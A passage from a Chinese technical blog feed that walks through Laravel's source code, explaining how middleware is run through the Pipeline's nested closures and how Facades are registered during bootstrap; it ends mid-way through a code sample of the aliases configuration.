Request进行过滤。</p><p>再比如Laravel自动给所有路由应用的<code>VerifyCsrfToken</code>中间件，在HTTP Requst进入应用走过<code>VerifyCsrfToken</code>中间件时会验证Token防止跨站请求伪造，在Http Response 离开应用前会给响应添加合适的Cookie。（laravel5.5开始CSRF中间件只自动应用到web路由上）</p><p>上面概述了下中间件在laravel中的角色，以及什么类型的代码应该从控制器挪到中间件里，至于如何定义和使用自己的laravel 中间件请参考<a href="https://d.laravel-china.org/docs/5.5/middleware" target="_blank" rel="noopener">官方文档</a>。</p><h2 id="中间件的实现"><a href="#中间件的实现" class="headerlink" title="中间件的实现"></a>中间件的实现</h2><p>下面我们主要来看一下Laravel中是怎么实现中间件的，中间件的设计应用了一种叫做装饰器的设计模式，在之前的基础篇中已经简单的介绍这种设计模式，具体可看之前推荐的文章<a href="https://www.cnblogs.com/firstForEver/p/8001711.html" target="_blank" rel="noopener">装饰器模式</a></p><h2 id="中间件的源码"><a href="#中间件的源码" class="headerlink" title="中间件的源码"></a>中间件的源码</h2><p>Laravel实例化Application后，会从服务容器里解析出Http Kernel对象，通过类的名字也能看出来Http Kernel就是Laravel里负责HTTP请求和响应的核心。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> \App\Http\Kernel $kernel</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$kernel = $app-&gt;make(Illuminate\Contracts\Http\Kernel::class);</span><br><span class="line"></span><br><span class="line">$response = $kernel-&gt;handle(</span><br><span class="line">    $request = Illuminate\Http\Request::capture()</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$response-&gt;send();</span><br><span class="line"></span><br><span class="line">$kernel-&gt;terminate($request, $response);</span><br></pre></td></tr></table></figure><p>在<code>index.php</code>里可以看到，从服务容器里解析出Http Kernel，因为在<code>bootstrap/app.php</code>里绑定了<code>Illuminate\Contracts\Http\Kernel</code>接口的实现类<code>App\Http\Kernel</code>所以$kernel实际上是<code>App\Http\Kernel</code>类的对象。<br>解析出Http Kernel后Laravel将进入应用的请求对象传递给Http Kernel的handle方法，在handle方法负责处理流入应用的请求对象并返回响应对象。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  /**</span><br><span class="line"> * Handle an incoming HTTP request.</span><br><span class="line"> *</span><br><span class="line"> * @param  \Illuminate\Http\Request  <span class="variable">$request</span></span><br><span class="line"> * @<span class="built_in">return</span> \Illuminate\Http\Response</span><br><span class="line"> */</span><br><span class="line">public <span class="keyword">function</span> handle(<span class="variable">$request</span>)</span><br><span class="line">&#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        <span class="variable">$request</span>-&gt;enableHttpMethodParameterOverride();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$response</span> = <span class="variable">$this</span>-&gt;sendRequestThroughRouter(<span class="variable">$request</span>);</span><br><span class="line">    &#125; catch (Exception <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;reportException(<span class="variable">$e</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$response</span> = <span class="variable">$this</span>-&gt;renderException(<span class="variable">$request</span>, <span class="variable">$e</span>);</span><br><span class="line">    &#125; catch (Throwable <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;reportException(<span class="variable">$e</span> = new FatalThrowableError(<span class="variable">$e</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$response</span> = <span class="variable">$this</span>-&gt;renderException(<span class="variable">$request</span>, <span class="variable">$e</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$this</span>-&gt;app[<span class="string">'events'</span>]-&gt;dispatch(</span><br><span class="line">        new Events\RequestHandled(<span class="variable">$request</span>, <span class="variable">$response</span>)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$response</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>中间件过滤应用的过程就发生在<code>$this-&gt;sendRequestThroughRouter($request)</code>里：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> /**</span><br><span class="line"> * Send the given request through the middleware / router.</span><br><span class="line"> *</span><br><span class="line"> * @param  \Illuminate\Http\Request  <span class="variable">$request</span></span><br><span class="line"> * @<span class="built_in">return</span> \Illuminate\Http\Response</span><br><span class="line"> */</span><br><span class="line">protected <span class="keyword">function</span> sendRequestThroughRouter(<span class="variable">$request</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$this</span>-&gt;app-&gt;instance(<span class="string">'request'</span>, <span class="variable">$request</span>);</span><br><span class="line"></span><br><span class="line">    Facade::clearResolvedInstance(<span class="string">'request'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$this</span>-&gt;bootstrap();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> (new Pipeline(<span class="variable">$this</span>-&gt;app))</span><br><span class="line">                -&gt;send(<span class="variable">$request</span>)</span><br><span class="line">                -&gt;through(<span class="variable">$this</span>-&gt;app-&gt;shouldSkipMiddleware() ? [] : <span class="variable">$this</span>-&gt;middleware)</span><br><span class="line">                -&gt;<span class="keyword">then</span>(<span class="variable">$this</span>-&gt;dispatchToRouter());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法的前半部分是对Application进行了初始化，在上一面讲解服务提供器的文章里有对这一部分的详细讲解。Laravel通过Pipeline（管道）对象来传输请求对象，在Pipeline中请求对象依次通过Http Kernel里定义的中间件的前置操作到达控制器的某个action或者直接闭包处理得到响应对象。</p><p>看下Pipeline里这几个方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> public <span class="keyword">function</span> send(<span class="variable">$passable</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$this</span>-&gt;passable = <span class="variable">$passable</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">function</span> through(<span class="variable">$pipes</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$this</span>-&gt;pipes = is_array(<span class="variable">$pipes</span>) ? <span class="variable">$pipes</span> : func_get_args();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">function</span> <span class="keyword">then</span>(Closure <span class="variable">$destination</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$firstSlice</span> = <span class="variable">$this</span>-&gt;getInitialSlice(<span class="variable">$destination</span>);</span><br><span class="line">    </span><br><span class="line">    //pipes 就是要通过的中间件</span><br><span class="line">    <span class="variable">$pipes</span> = array_reverse(<span class="variable">$this</span>-&gt;pipes);</span><br><span class="line"></span><br><span class="line">    //<span class="variable">$this</span>-&gt;passable就是Request对象</span><br><span class="line">    <span class="built_in">return</span> call_user_func(</span><br><span class="line">        array_reduce(<span class="variable">$pipes</span>, <span class="variable">$this</span>-&gt;getSlice(), <span class="variable">$firstSlice</span>), <span class="variable">$this</span>-&gt;passable</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">protected <span class="keyword">function</span> getInitialSlice(Closure <span class="variable">$destination</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">return</span> <span class="keyword">function</span> (<span class="variable">$passable</span>) use (<span class="variable">$destination</span>) &#123;</span><br><span class="line">        <span class="built_in">return</span> call_user_func(<span class="variable">$destination</span>, <span class="variable">$passable</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//Http Kernel的dispatchToRouter是Piple管道的终点或者叫目的地</span><br><span class="line">protected <span class="keyword">function</span> dispatchToRouter()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">return</span> <span class="keyword">function</span> (<span class="variable">$request</span>) &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;app-&gt;instance(<span class="string">'request'</span>, <span class="variable">$request</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;router-&gt;dispatch(<span class="variable">$request</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的函数看起来比较晕，我们先来看下array_reduce里对它的callback函数参数的解释：</p><blockquote><p>mixed array_reduce ( array $array , callable $callback [, mixed $initial = NULL ] )</p></blockquote><blockquote><p>array_reduce() 将回调函数 callback 迭代地作用到 array 数组中的每一个单元中，从而将数组简化为单一的值。</p></blockquote><blockquote><p>callback ( mixed $carry , mixed $item )<br>carry<br>携带上次迭代里的值； 如果本次迭代是第一次，那么这个值是 initial。item 携带了本次迭代的值。</p></blockquote><p>getInitialSlice方法，他的返回值是作为传递给callbakc函数的$carry参数的初始值，这个值现在是一个闭包，我把getInitialSlice和Http Kernel的dispatchToRouter这两个方法合并一下，现在$firstSlice的值为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$destination = <span class="function"><span class="keyword">function</span> <span class="params">($request)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;app-&gt;instance(<span class="string">'request'</span>, $request);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;router-&gt;dispatch($request);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">$firstSlice = <span class="function"><span class="keyword">function</span> <span class="params">($passable)</span> <span class="title">use</span> <span class="params">($destination)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> call_user_func($destination, $passable);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接下来我们看看array_reduce的callback:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> //Pipeline </span><br><span class="line">protected <span class="keyword">function</span> getSlice()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">return</span> <span class="keyword">function</span> (<span class="variable">$stack</span>, <span class="variable">$pipe</span>) &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="keyword">function</span> (<span class="variable">$passable</span>) use (<span class="variable">$stack</span>, <span class="variable">$pipe</span>) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                <span class="variable">$slice</span> = parent::getSlice();</span><br><span class="line"></span><br><span class="line">                <span class="built_in">return</span> call_user_func(<span class="variable">$slice</span>(<span class="variable">$stack</span>, <span class="variable">$pipe</span>), <span class="variable">$passable</span>);</span><br><span class="line">            &#125; catch (Exception <span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="built_in">return</span> <span class="variable">$this</span>-&gt;handleException(<span class="variable">$passable</span>, <span class="variable">$e</span>);</span><br><span class="line">            &#125; catch (Throwable <span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="built_in">return</span> <span class="variable">$this</span>-&gt;handleException(<span class="variable">$passable</span>, new FatalThrowableError(<span class="variable">$e</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//Pipleline的父类BasePipeline的getSlice方法</span><br><span class="line">protected <span class="keyword">function</span> getSlice()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">return</span> <span class="keyword">function</span> (<span class="variable">$stack</span>, <span class="variable">$pipe</span>) &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="keyword">function</span> (<span class="variable">$passable</span>) use (<span class="variable">$stack</span>, <span class="variable">$pipe</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$pipe</span> instanceof Closure) &#123;</span><br><span class="line">                <span class="built_in">return</span> call_user_func(<span class="variable">$pipe</span>, <span class="variable">$passable</span>, <span class="variable">$stack</span>);</span><br><span class="line">            &#125; elseif (! is_object(<span class="variable">$pipe</span>)) &#123;</span><br><span class="line">                //解析中间件名称和参数 (<span class="string">'throttle:60,1'</span>)</span><br><span class="line">                list(<span class="variable">$name</span>, <span class="variable">$parameters</span>) = <span class="variable">$this</span>-&gt;parsePipeString(<span class="variable">$pipe</span>);</span><br><span class="line">                <span class="variable">$pipe</span> = <span class="variable">$this</span>-&gt;container-&gt;make(<span class="variable">$name</span>);</span><br><span class="line">                <span class="variable">$parameters</span> = array_merge([<span class="variable">$passable</span>, <span class="variable">$stack</span>], <span class="variable">$parameters</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$parameters</span> = [<span class="variable">$passable</span>, <span class="variable">$stack</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            //<span class="variable">$this</span>-&gt;method = handle</span><br><span class="line">            <span class="built_in">return</span> call_user_func_array([<span class="variable">$pipe</span>, <span class="variable">$this</span>-&gt;method], <span class="variable">$parameters</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>注：在Laravel5.5版本里 getSlice这个方法的名称换成了carry, 两者在逻辑上没有区别，所以依然可以参照着5.5版本里中间件的代码来看本文。</strong></p><p>getSlice会返回一个闭包函数, $stack在第一次调用getSlice时它的值是$firstSlice, 之后的调用中就它的值就是这里返回的值个闭包了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$stack</span> = <span class="keyword">function</span> (<span class="variable">$passable</span>) use (<span class="variable">$stack</span>, <span class="variable">$pipe</span>) &#123;</span><br><span class="line">               try &#123;</span><br><span class="line">                   <span class="variable">$slice</span> = parent::getSlice();</span><br><span class="line"></span><br><span class="line">                   <span class="built_in">return</span> call_user_func(<span class="variable">$slice</span>(<span class="variable">$stack</span>, <span class="variable">$pipe</span>), <span class="variable">$passable</span>);</span><br><span class="line">               &#125; catch (Exception <span class="variable">$e</span>) &#123;</span><br><span class="line">                   <span class="built_in">return</span> <span class="variable">$this</span>-&gt;handleException(<span class="variable">$passable</span>, <span class="variable">$e</span>);</span><br><span class="line">               &#125; catch (Throwable <span class="variable">$e</span>) &#123;</span><br><span class="line">                   <span class="built_in">return</span> <span class="variable">$this</span>-&gt;handleException(<span class="variable">$passable</span>, new FatalThrowableError(<span class="variable">$e</span>));</span><br><span class="line">               &#125;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><p>getSlice返回的闭包里又会去调用父类的getSlice方法，他返回的也是一个闭包，在闭包会里解析出中间件对象、中间件参数(无则为空数组), 然后把$passable(请求对象), $stack和中间件参数作为中间件handle方法的参数进行调用。</p><p>上面封装的有点复杂，我们简化一下，其实getSlice的返回值就是:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stack</span> = <span class="keyword">function</span> (<span class="variable">$passable</span>) use (<span class="variable">$stack</span>, <span class="variable">$pipe</span>) &#123;</span><br><span class="line">                   //解析中间件和中间件参数，中间件参数用<span class="variable">$parameter</span>代表，无参数时为空数组</span><br><span class="line">                  <span class="variable">$parameters</span> = array_merge([<span class="variable">$passable</span>, <span class="variable">$stack</span>], <span class="variable">$parameters</span>)</span><br><span class="line">                  <span class="built_in">return</span> <span class="variable">$pipe</span>-&gt;handle(<span class="variable">$parameters</span>)</span><br><span class="line">   &#125;;</span><br></pre></td></tr></table></figure></p><p>array_reduce每次调用callback返回的闭包都会作为参数$stack传递给下一次对callback的调用，array_reduce执行完成后就会返回一个嵌套了多层闭包的闭包，每层闭包用到的外部变量$stack都是上一次之前执行reduce返回的闭包，相当于把中间件通过闭包层层包裹包成了一个洋葱。</p><p>在then方法里，等到array_reduce执行完返回最终结果后就会对这个洋葱闭包进行调用:<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">return</span> call_user_func( array_reduce(<span class="variable">$pipes</span>, <span class="variable">$this</span>-&gt;getSlice(), <span class="variable">$firstSlice</span>), <span class="variable">$this</span>-&gt;passable);</span><br></pre></td></tr></table></figure></p><p> 这样就能依次执行中间件handle方法，在handle方法里又会去再次调用之前说的reduce包装的洋葱闭包剩余的部分，这样一层层的把洋葱剥开直到最后。通过这种方式让请求对象依次流过了要通过的中间件，达到目的地Http Kernel 的<code>dispatchToRouter</code>方法。</p><p>通过剥洋葱的过程我们就能知道为什么在array_reduce之前要先对middleware数组进行反转, 因为包装是一个反向的过程, 数组$pipes中的第一个中间件会作为第一次reduce执行的结果被包装在洋葱闭包的最内层，所以只有反转后才能保证初始定义的中间件数组中第一个中间件的handle方法会被最先调用。</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>laravel学习之Facades</title>
      <link href="/2018/10/11/laravel%E5%AD%A6%E4%B9%A0%E4%B9%8BFacades/"/>
      <url>/2018/10/11/laravel%E5%AD%A6%E4%B9%A0%E4%B9%8BFacades/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>说完了服务提供者，接下来肯定不要忘了Facdes，因为在写<a href="https://github.com/shisiying/sevenshi-serverchan" target="_blank" rel="noopener">一个基于server酱推送服务的laravel package,包含一对一和一对多推送</a>的时候，里面也写了一个Facade，接下来，我们就慢慢的来介绍这个Facade</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: seven</span><br><span class="line"> * Date: 2018/7/18</span><br><span class="line"> * Time: 10:52</span><br><span class="line"> */</span><br><span class="line">namespace Sevenshi\Serverchan;</span><br><span class="line">use \Illuminate\Support\Facades\Facade;</span><br><span class="line">class SevenFacade extends Facade</span><br><span class="line">&#123;</span><br><span class="line">    protected static <span class="keyword">function</span> <span class="function"><span class="title">getFacadeAccessor</span></span>() &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="string">'serverchan'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="什么是Facades"><a href="#什么是Facades" class="headerlink" title="什么是Facades"></a>什么是Facades</h3><p>Facades是我们在Laravel应用开发中使用频率很高的一个组件，叫组件不太合适，其实它们是一组静态类接口或者说代理，让开发者能简单的访问绑定到服务容器里的各种服务。Laravel文档中对Facades的解释如下：</p><blockquote><p>Facades 为应用程序的 服务容器 中可用的类提供了一个「静态」接口。Laravel 本身附带许多的 facades，甚至你可能在不知情的状况下已经在使用他们！Laravel 「facades」作为在服务容器内基类的「静态代理」，拥有简洁、易表达的语法优点，同时维持着比传统静态方法更高的可测试性和灵活性。</p></blockquote><p>我们经常用的Route就是一个Facade, 它是<code>\Illuminate\Support\Facades\Route</code>类的别名，这个Facade类代理的是注册到服务容器里的<code>router</code>服务，所以通过Route类我们就能够方便地使用router服务中提供的各种服务，而其中涉及到的服务解析完全是隐式地由Laravel完成的，这在一定程度上让应用程序代码变的简洁了不少。下面我们会大概看一下Facades从被注册进Laravel框架到被应用程序使用这中间的流程。Facades是和ServiceProvider紧密配合的所以如果你了解了中间的这些流程对开发自定义Laravel组件会很有帮助。</p><h3 id="注册Facades"><a href="#注册Facades" class="headerlink" title="注册Facades"></a>注册Facades</h3><p>说到Facades注册又要回到再介绍其它核心组建时提到过很多次的Bootstrap阶段了，在让请求通过中间件和路由之前有一个启动应用程序的过程：</p><pre><code>//Class: \Illuminate\Foundation\Http\Kernel</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  protected <span class="keyword">function</span> sendRequestThroughRouter(<span class="variable">$request</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$this</span>-&gt;app-&gt;instance(<span class="string">'request'</span>, <span class="variable">$request</span>);</span><br><span class="line"></span><br><span class="line">    Facade::clearResolvedInstance(<span class="string">'request'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$this</span>-&gt;bootstrap();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> (new Pipeline(<span class="variable">$this</span>-&gt;app))</span><br><span class="line">                    -&gt;send(<span class="variable">$request</span>)</span><br><span class="line">                    -&gt;through(<span class="variable">$this</span>-&gt;app-&gt;shouldSkipMiddleware() ? [] : <span class="variable">$this</span>-&gt;middleware)</span><br><span class="line">                    -&gt;<span class="keyword">then</span>(<span class="variable">$this</span>-&gt;dispatchToRouter());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```     </span><br><span class="line">  </span><br><span class="line">    </span><br><span class="line">//引导启动Laravel应用程序</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">public <span class="keyword">function</span> bootstrap()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable">$this</span>-&gt;app-&gt;hasBeenBootstrapped()) &#123;</span><br><span class="line">        /**依次执行<span class="variable">$bootstrappers</span>中每一个bootstrapper的bootstrap()函数</span><br><span class="line">         <span class="variable">$bootstrappers</span> = [</span><br><span class="line">                     <span class="string">'Illuminate\Foundation\Bootstrap\DetectEnvironment'</span>,</span><br><span class="line">                     <span class="string">'Illuminate\Foundation\Bootstrap\LoadConfiguration'</span>,</span><br><span class="line">                     <span class="string">'Illuminate\Foundation\Bootstrap\ConfigureLogging'</span>,</span><br><span class="line">                     <span class="string">'Illuminate\Foundation\Bootstrap\HandleExceptions'</span>,</span><br><span class="line">                     <span class="string">'Illuminate\Foundation\Bootstrap\RegisterFacades'</span>,</span><br><span class="line">                     <span class="string">'Illuminate\Foundation\Bootstrap\RegisterProviders'</span>,</span><br><span class="line">                     <span class="string">'Illuminate\Foundation\Bootstrap\BootProviders'</span>,</span><br><span class="line">                ];*/</span><br><span class="line">                <span class="variable">$this</span>-&gt;app-&gt;bootstrapWith(<span class="variable">$this</span>-&gt;bootstrappers());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在启动应用的过程中<code>Illuminate\Foundation\Bootstrap\RegisterFacades</code>这个阶段会注册应用程序里用到的Facades。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RegisterFacades</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Bootstrap the given application.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  \Illuminate\Contracts\Foundation\Application  $app</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bootstrap</span><span class="params">(Application $app)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Facade::clearResolvedInstances();</span><br><span class="line"></span><br><span class="line">        Facade::setFacadeApplication($app);</span><br><span class="line"></span><br><span class="line">        AliasLoader::getInstance(array_merge(</span><br><span class="line">            $app-&gt;make(<span class="string">'config'</span>)-&gt;get(<span class="string">'app.aliases'</span>, []),</span><br><span class="line">            $app-&gt;make(PackageManifest::class)-&gt;aliases()</span><br><span class="line">        ))-&gt;register();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里会通过<code>AliasLoader</code>类的实例将为所有Facades注册别名，Facades和别名的对应关系存放在<code>config/app.php</code>文件的<code>$aliases</code>数组中<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'aliases'</span> =&gt; [</span><br><span class="line"></span><br><span class="line">    <span class="string">'App'</span> =&gt; 